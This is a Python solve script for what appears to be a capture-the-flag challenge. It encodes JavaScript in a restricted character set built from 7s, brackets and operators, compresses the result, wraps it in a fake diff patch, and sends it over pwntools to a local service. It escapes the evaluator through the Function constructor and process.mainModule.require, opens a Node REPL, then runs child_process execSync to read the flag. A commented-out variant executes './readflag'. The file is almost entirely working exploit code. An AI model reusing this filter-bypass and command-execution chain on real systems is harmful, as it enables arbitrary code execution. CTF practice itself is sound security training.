print("warning: solve does not have atsub tables or firstuse technology!!!")
from pwn import *
from string import printable
from base64 import b64encode, b64decode
import esprima
from itertools import product
import escodegen
from time import time

printable = printable[:-6]

subst_letters = {
    "f": "((7==77)+[])[+[]]",
    "a": "(777777+[7==77])[7]",
    "l": "((7==77)+[7==77])[7]",
    "s": "((7==7)+[7==77])[7]",
    "e": "([]+7[7])[7]",
    "t": "((7==7)+[])[+[]]",
    "r": "(777777+[7==7])[7]",
    "u": "(7[7]+[])[+[]]",
    "n": "([7]+7[7])[7]",
    "d": "([7==77]+7[7])[7]",
    "i": "([77]+7[7])[7]",
    "y": "(+(7+([]+7[7])[7]+7+7+7)+[])[7]",
    "N": "([]+-7[7])[+[]]",
    ".": "(+(77+([]+7[7])[7]+77)+[])[+(7==7)]",
    "c": "(7777+[][(777777+[7==77])[7]+((7==7)+[])[+[]]])[7]",
    "7": "(7+[])"  # yeah ik i can elim a few chars because string concat but dont want to have any issues
}


def conjure(s):
    total = []
    for c in s:
        assert c in subst_letters, f"havent unlocked '{c}' yet"
        total.append(subst_letters[c])
    return "+".join(total)


subst_letters["o"] = f"(7+[][{conjure('at')}])[7]"
subst_letters[" "] = f"(7+[][{conjure('at')}])[7+7]"
subst_letters["b"] = f"([][{conjure('entries')}]()+[])[(7==7)+(7==7)]"
subst_letters["m"] = f"((+[])[{conjure('constructor')}]+[])[+(7==7)+[]+ +(7==7)]"
subst_letters["S"] = f"(+[]+(7+[])[{conjure('constructor')}])[+(7==7)+[+[]]]"
subst_letters["g"] = f"((7==77)+[]+[+[]]+((7+[])[{conjure('constructor')}]))[(7==7)+(7==7)+[]+ +[]]"
subst_letters["p"] = f"(7777)[{conjure('to')}+(7+[])[{conjure('constructor')}][{conjure('name')}]](7+7+7+7)[+(7==7)]"

# (7).__proto__['7-7'] = (7).__proto__
proto_shortcut_varname = '7+[-7]'
proto_shortcut = f"7[{conjure('constructor')}][{conjure('prototype')}][{proto_shortcut_varname}]=7[{conjure('constructor')}][{conjure('prototype')}]"

# replace the ones that use functions for better compression bc repeated constructor
subst_letters["o"] = f"(7+[][{conjure('constructor')}])[7]"
subst_letters[" "] = f"([]+[][{conjure('constructor')}])[7+(7==7)]"
subst_letters["m"] = f"((+[])[{conjure('constructor')}]+[])[+(7==7)+[]+ +(7==7)]"
subst_letters["S"] = f"(+[]+(7+[])[{conjure('constructor')}])[+(7==7)+[+[]]]"
subst_letters["g"] = f"((7==77)+[]+[+[]]+((7+[])[{conjure('constructor')}]))[(7==7)+(7==7)+[]+ +[]]"
subst_letters["p"] = f"(7777)[{conjure('to')}+(7+[])[{conjure('constructor')}][{conjure('name')}]](7+7+7+7)[+(7==7)]"

# Function
function = f"[][{conjure('constructor')}][{conjure('constructor')}]"

# Function("return btoa")()
btoa = f"{function}({conjure('return btoa')})()"

# Function("return atob")()
atob = f"{function}({conjure('return atob')})()"

subst_letters["_"] = f"{atob}(7+{conjure('l')}+(7+(7==7))+7)[+(7==7)]"
subst_letters["h"] = f"{atob}({conjure('aN')})"
subst_letters["q"] = f"{atob}({conjure('ca')})"
subst_letters["v"] = f"{atob}({conjure('dt')})"
subst_letters["M"] = f"{btoa}(+[]+[])[+[]]"
#subst_letters["F"] = f"([77777]+{btoa})[7+7]"

# bruting btoa
store_btoa = {}
for a in subst_letters:
    for b in subst_letters:
        for c in subst_letters:
            for char in b64encode((a+b+c).encode()).decode():
                if char not in store_btoa or len(conjure(store_btoa[char])) > len(conjure(a+b+c)):
                    store_btoa[char] = a+b+c
        for char in b64encode((a+b).encode()).decode():
            if char not in store_btoa or len(conjure(store_btoa[char])) > len(conjure(a+b)):
                store_btoa[char] = a+b
    for char in b64encode((a).encode()).decode():
        if char not in store_btoa or len(conjure(store_btoa[char])) > len(conjure(a)):
            store_btoa[char] = a
# bruting atob
store_atob = {}
subst_letters_clean = [c for c in subst_letters if c in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"]
for a in subst_letters_clean:
    for b in subst_letters_clean:
        for c in subst_letters_clean:
            for d in subst_letters_clean:
                for char in b64decode((a+b+c+d).encode()).decode('latin-1'):
                    if char not in store_atob or len(conjure(store_atob[char])) > len(conjure(a+b+c+d)):
                        store_atob[char] = a+b+c+d
            for char in b64decode((a+b+c+'=').encode()).decode('latin-1'):
                if char not in store_atob or len(conjure(store_atob[char])) > len(conjure(a+b+c)):
                    store_atob[char] = a+b+c
        for char in b64decode((a+b + '==').encode()).decode('latin-1'):
            if char not in store_atob or len(conjure(store_atob[char])) > len(conjure(a+b)):
                store_atob[char] = a+b


def conjure_num(n):
    if n == 0:
        return '+[]'
    elif n == 1:
        return '+(7==7)'
    elif isinstance(n, int) and n > 0:
        return '+'.join(['(7==7)'] * n)
    raise NotImplementedError("bad")


for char in store_btoa:
    recipe = f"{btoa}({conjure(store_btoa[char])})[{conjure_num(b64encode(store_btoa[char].encode()).decode().index(char))}]"
    if char not in subst_letters or len(recipe) < len(subst_letters[char]):
        subst_letters[char] = recipe
for char in store_atob:
    recipe = f"{atob}({conjure(store_atob[char])})[{conjure_num(b64decode(store_atob[char].ljust(4, '=').encode()).decode('latin-1').index(char))}]"
    if char not in subst_letters or len(recipe) < len(subst_letters[char]):
        subst_letters[char] = recipe

# new way of doing it
# goal is require('repl').start()
# then we can cram in some extra stdin by sending some extra lines after our patch line in the same packet as the patch line
real = f"{function}({conjure('return process')})()[{conjure('mainModule')}][{conjure('require')}]({conjure('repl')})[{conjure('start')}]()"

# old way of doing it
# goal is require('child_process').execSync('./readflag')
# real = f"{function}({conjure('return process')})()[{conjure('mainModule')}][{conjure('require')}]({conjure('child_process')})[{conjure('execSync')}]({conjure('./readflag')})+[]"

# optimization "variable names"
def gen_varnames():
    it = ['[]', '-7', '77', '-77', '7+7', '777', '-777', '7-77', '77-7', '7+77', '7777', '7==7', '-7777', '777-7', '7-777', '77777', '7+7+7', '-7-77', '7==77', '7+777'
          '777777'] 
    assert proto_shortcut_varname not in it
    return it#[::-1]

# garbage not working function
# def gen_varnames():
#     found = []
#     usable = ['7', '-7', '-77', '-777', '-7777', '-77777', '-777777', '-7777777', '(+[])',
#               '77', '777', '7777', '77777', '777777', '7777777', '77777777', '(7==7)', '(7==77)']
#     for count in range(1, 3):
#         iterd = product(*([usable] * count))
#         for tupl in iterd:
#             total = ''
#             previous_was_bad_plus = 0
#             previous_was_number_end = False
#             #print(tupl)
#             for w in tupl:
#                 if set(w) == {"7"} or set(w) == {"-", "7"} or set(w) == {"7", "[", "]"} or {"7", "[", "]", "-"}:
#                     if previous_was_number_end and w[0] == '7':
#                         break  # we exit here because it is bad
#                     if w[-1] == '7':
#                         previous_was_number_end = True
#                     if previous_was_bad_plus == 1:
#                         total += '[]+'
#                     previous_was_bad_plus += 1
#                 else:
#                     previous_was_bad_plus = 0
#                 total += w
#                 total += '+'
#             else:
#                 found.append(total[:-1])
#     return [name for name in list(sorted(found, key=lambda expr: len(expr)))]

varnames = gen_varnames()

# time to optimize the real
tree2code = lambda tree: escodegen.generate(tree, {"format": escodegen.FORMAT_MINIFY}).rstrip(";")
code2tree = lambda code: esprima.parseScript(code) 
real = tree2code(code2tree(real))
old_length = len(real)
real_trees = [code2tree(real)]


def sub_tree(tree, get_out_tree, put_in_tree):
    if hash_good(tree) == hash_good(get_out_tree):
        return put_in_tree
    if isinstance(tree, (str, bool, int)):
        return tree
    elif isinstance(tree, list):
        return [sub_tree(item, get_out_tree, put_in_tree) for item in tree]
    elif isinstance(tree, (esprima.nodes.Script, esprima.nodes.ExpressionStatement, esprima.nodes.ComputedMemberExpression,
                           esprima.nodes.Literal, esprima.nodes.BinaryExpression, esprima.nodes.CallExpression, esprima.nodes.ArrayExpression,
                           esprima.nodes.UnaryExpression, esprima.nodes.Identifier, esprima.nodes.AssignmentExpression)):
        dict_new = {k: sub_tree(tree.__dict__[k], get_out_tree, put_in_tree) for k in tree.__dict__ if k not in ("_hash_cache", "type", "computed", "prefix", "sourceType")}
        if isinstance(tree, esprima.nodes.CallExpression):
            dict_new['args'] = dict_new.pop('arguments')
        return tree.__class__(**dict_new)
    else:
        raise NotImplementedError(f"bad {type(tree)} ({dir(tree)})")


max_substs = 3000  # set low for debugging
while True:
    max_substs -= 1
    hash_to_length = {}  # hash good to code length
    hash_to_tree = {}  # get the tree from the hash
    hash_to_count = {}  # num occurences of each hash
    hash_to_count_per_real_tree = {}  # num occurences of each hash per real tree

    def len_good(node):
        """length as in code length when tree2code"""
        if isinstance(node, (str, bool, int)):
            return 0
        elif isinstance(node, list):  # list does NOT include comma lengths !!!
            return sum([len_good(k) for k in node])
    
        node_hash = hash_good(node)
    
        if node_hash not in hash_to_tree:
            hash_to_tree[node_hash] = node
    
        if node_hash in hash_to_length:
            return hash_to_length[node_hash]
    
        # print(list(node.__dict__), type(node))
        if isinstance(node, esprima.nodes.Script):  # exprstmt;exprstmt;exprstmt;exprstmt
            hash_to_length[node_hash] = max(len(node.body)-1, 0) + len_good(node.body)
        elif isinstance(node, esprima.nodes.ExpressionStatement):  # expr
            hash_to_length[node_hash] = len_good(node.expression)
        elif isinstance(node, esprima.nodes.BinaryExpression):  # expr+expr
            hash_to_length[node_hash] = len(node.operator) + len_good(node.left) + len_good(node.right)
            if node.operator == "+":
                if node.left.type == "BinaryExpression" and node.left.operator == "==":
                    hash_to_length[node_hash] += 2  # parens
                if node.right.type == "BinaryExpression":
                    hash_to_length[node_hash] += 2  # parens
                if node.right.type == "UnaryExpression" and node.right.operator == "+":
                    hash_to_length[node_hash] += 1  # space
        elif isinstance(node, esprima.nodes.CallExpression):  # expr(expr,expr,expr)
            hash_to_length[node_hash] = 2 + len_good(node.callee) + sum(len_good(v) for v in node.arguments) + max(len(node.arguments)-1, 0)
            if node.callee.type in ("BinaryExpression", 'UnaryExpression'):  # lower precedence so we add 2 for parens
                hash_to_length[node_hash] += 2
        elif isinstance(node, esprima.nodes.ComputedMemberExpression):  # expr[expr]
             hash_to_length[node_hash] = 2 + len_good(node.object) + len_good(node.property)
             if node.object.type in ("BinaryExpression", 'UnaryExpression'):  # lower precedence so we add 2 for parens
                hash_to_length[node_hash] += 2
        elif isinstance(node, esprima.nodes.ArrayExpression):  # [expr,expr,expr,expr]
            hash_to_length[node_hash] = 2 + max(len(node.elements)-1, 0) + len_good(node.elements)
        elif isinstance(node, esprima.nodes.Literal):  # 777
            hash_to_length[node_hash] = len(node.raw)
        elif isinstance(node, esprima.nodes.UnaryExpression):  # +expr
            hash_to_length[node_hash] = len(node.operator) + len_good(node.argument)
            if node.argument.type == "BinaryExpression":  # lower precedence so we add 2 for parens
                hash_to_length[node_hash] += 2
        elif isinstance(node, esprima.nodes.Identifier):
            hash_to_length[node_hash] = len(node.name)
        elif isinstance(node, esprima.nodes.AssignmentExpression):
            hash_to_length[node_hash] = len_good(node.left) + 1 + len_good(node.right)  # highest precedence yay less work
        else:
            raise NotImplementedError(f"bad {type(node)} {dir(node)}")
    
        return hash_to_length[node_hash]
 
 
    def counting(v, i):
        #print(v)
        if isinstance(v, (str, bool, int)):
            return
        elif isinstance(v, list):
            for k in v:
                counting(k, i)
        elif isinstance(v, (esprima.nodes.Script, esprima.nodes.ExpressionStatement, esprima.nodes.ComputedMemberExpression,
                            esprima.nodes.Literal, esprima.nodes.BinaryExpression, esprima.nodes.CallExpression, esprima.nodes.ArrayExpression,
                            esprima.nodes.UnaryExpression, esprima.nodes.Identifier, esprima.nodes.AssignmentExpression)):
            node_hash = hash_good(v)
            hash_to_count[node_hash] = hash_to_count.get(node_hash, 0)+1
            hash_to_count_per_real_tree[node_hash] = hash_to_count_per_real_tree.get(node_hash, [0]*len(real_trees))
            hash_to_count_per_real_tree[node_hash][i] += 1
            for k in v.__dict__:
                counting(getattr(v, k), i)
        else:
            raise NotImplementedError(f"bad {type(v)} ({dir(v)})")
    
    
    def hash_good(v):
        #print(v)
        if isinstance(v, (str, bool, int)):
            return hash(v)
        elif isinstance(v, list):
            return sum([hash_good(k) for k in v])
        elif isinstance(v, (esprima.nodes.Script, esprima.nodes.ExpressionStatement, esprima.nodes.ComputedMemberExpression,
                            esprima.nodes.Literal, esprima.nodes.BinaryExpression, esprima.nodes.CallExpression, esprima.nodes.ArrayExpression,
                            esprima.nodes.UnaryExpression, esprima.nodes.Identifier, esprima.nodes.AssignmentExpression)):
            if v._hash_cache is None:
                v._hash_cache = sum([hash(k)*2+7+hash_good(getattr(v, k))^((hash_good(getattr(v, k))**2) % (2**65)) for k in v.__dict__])
            return v._hash_cache
        else:
            raise NotImplementedError(f"bad {type(v)} ({dir(v)})")

    #pee = "p"
    #real = f'{conjure(pee)}'
    #real = '[([7]+7[7])[7]+(777777+[7==77])[7]+((+[])["constructor"]+[])[+(7==7)+[]+ +(7==7)]+([]+7[7])[7]]'
    
    for i, real_tree in enumerate(real_trees):
        len_good(real_tree)
        counting(real_tree, i)

    #print(f"{len_good(real_tree) = }")
    #print(f"{len(tree2code(real_tree)) = }")
    
    optimization_var = None
    lowest_length = None
    lowest_hash = None
    new_varname = varnames.pop(0)
    for h in hash_to_tree:
        # imagine we are substituting out all instances of hash_to_tree[h] using the proto as a variable storage
    
        # each new expressionstatement costs 4 for the brackets, and each variable setting expression costs
        # 1+P+2+K+1+N where P is len(proto_shortcut_varname), N is the hash_to_length[h], and K is the length of the variable name
        # (1+P+2+K+1 gets "7[<proto_shortcut_varname>][<K long varname>]=" btw)
    
        # ideally, we would save characters by doing substitution. one copy of the substituted expression will remain,
        # and some roughly constant number of chars (1+2+K) will be used for the supporting structures. each
        # substitution also costs some because we have to get 7[<K long varname>] for each replaced instance
    
        # also i am just using a greedy alg because i am lazy and this should still be really good compression
        new_length = old_length - hash_to_count[h]*hash_to_length[h] + hash_to_count[h]*(1+2+len(new_varname)) + 4 + 1+len(proto_shortcut_varname)+2+len(new_varname)+1+hash_to_length[h]

        # for debugging purposes
        # tree_code = tree2code(hash_to_tree[h])
        # print(f"{old_length} -> {new_length} ({hash_to_count[h]}/{real.count(tree_code)} estimated/real instances, {hash_to_length[h]} length) by "
        #       f"{tree_code[:40] + ('...' if len(tree_code) > 40 else '')}")

        # obvious quantifier for success
        if optimization_var is None or new_length < optimization_var:
            optimization_var = new_length
            lowest_length = new_length
            lowest_hash = h

        # go for substituting out a few large trees
        # if (hash_to_count[h] > 1) and (optimization_var is None or optimization_var < hash_to_length[h]):
        #     optimization_var = hash_to_length[h]
        #     lowest_length = new_length
        #     lowest_hash = h

    #print(new_length, hash_to_count[lowest_hash], hash_to_length[lowest_hash])
    if lowest_length >= old_length:
        print('all bad options, done')
        #print(hash_to_count_per_real_tree[hash_good(esprima.parseScript('(777777+[7==77])[7]').body[0].expression)])
        #print(tree2code(real_trees[0]))
        break
 
    print(f'best is {old_length} -> {lowest_length}')
    mysterious_tree_manufacturing_facility = []  # idfk what i am doing anymore help
    for real_tree in real_trees:
        new_real_tree = sub_tree(real_tree, hash_to_tree[lowest_hash], esprima.parseScript(f'7[{new_varname}]').body[0].expression)
        mysterious_tree_manufacturing_facility.append(new_real_tree)
    declare_expr_tree = esprima.parseScript(f'7[{proto_shortcut_varname}][{new_varname}]={tree2code(hash_to_tree[lowest_hash])}')
    mysterious_tree_manufacturing_facility.insert([i for i, amount in enumerate(hash_to_count_per_real_tree[lowest_hash]) if amount != 0][0], declare_expr_tree)
    real_trees = mysterious_tree_manufacturing_facility
    old_length = lowest_length
    print(f'pass done with varname {new_varname}, counts {hash_to_count_per_real_tree[lowest_hash]}, code length {hash_to_length[lowest_hash]}')
    if max_substs == 0:
        break



statements = [
    proto_shortcut,
    *[tree2code(tree) for tree in real_trees]
]

print(f'{len(proto_shortcut) = }')

# take some js statements and run multiple of them by doing brackets a bunch, last expression contents are revealed through stderr
final = ""
if len(statements) >= 3:
    final = f"{statements[0]}"
    for statement in statements[1:-1]:
        final = f"[{final}][{statement}]"
    final = f"[{final}][{statements[-1]}]"
    # todo fix to leak through stderr
    #final = f"{final}[{statements[-1]}]"
elif len(statements) == 2:
    final = f"7[{statements[0]}][{statements[1]}]"
elif len(statements) == 1:
    final = f"7[7][{statements[0]}]"

# uncomment for debugging purposes
# final = "[" + ",".join(statements) + "]"

payload = f"""
--- 777
+++ 777
@@ -7 +7 @@
-777
+{final}
""".strip()

# uncomment for debugging purposes
with open('out-debug.js', 'w') as f:
    # f.write(f'console.log({final})\n')
    f.write(f'console.log({"[" + ",".join(statements) + "]"})\n')

payload = payload.replace('\n', '!').encode() + b'!'
realpayload = 'require("child_process").execSync("cat /flag*",{stdio:"inherit"})'.encode()

#p = process(["node", 'index.js'])
p = remote("localhost", 5000)

p.sendline(payload)

p.recvuntil(b'running')

p.sendline(realpayload)

#print(p.recv(10000))

p.interactive()

